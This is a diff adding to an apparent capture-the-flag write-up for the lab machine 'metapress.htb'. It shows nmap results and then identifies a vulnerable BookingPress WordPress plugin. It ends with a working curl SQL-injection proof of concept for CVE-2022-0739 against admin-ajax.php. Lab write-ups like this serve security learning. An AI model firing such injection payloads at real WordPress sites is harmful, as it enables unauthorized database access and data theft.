@@ -40,14 +40,33 @@ Nmap done: 1 IP address (1 host up) scanned in 254.82 seconds
 <br>
 
 Scan Result
+|port|status|service|
 |:---|:---|:---|
 |21|open|FTP(vsftpd)|
 |22|open|SSH(OpenSSH 8.4p1)|
 |80|open|HTTP(nginx 1.18.0)|
+
 <br>
 
 # 2. Vulnerability Assessment
 Following is the main page of target machine, which was powered by `Wordpress`
+<img width="600" height="400" alt="image" src="https://github.com/user-attachments/assets/0c7ec345-c65b-45aa-abc1-ded58805b8af" />
+
+<br>
+
+`WPscan` was attempted, but nothing showed from the target system. As shown above, the only option was to visit `events` to check if any useful information could be found. Visiting the directory itself showed none of the useful information. Checking the source of the page, the `events` directory was ran by `bookingpress 1.0.11`, which is vulnerable to SQLi (CVE-2022-0739).
+<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/29166e3c-b296-4025-8b7a-164bd2aa8137" />
+
+<br>
+
+## 2-1. BookingPress SQLi (CVE-2022-0739)
+Searching for confirmed vulnerability, the exploitation uses vulnerability inside `admin-ajax.php` under `wp-admin` directory, which was not using sanitized parameter. Following is the proof of concept:
+```bash
+curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=ba6f278b09&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
+```
+
+
+
 
 
 
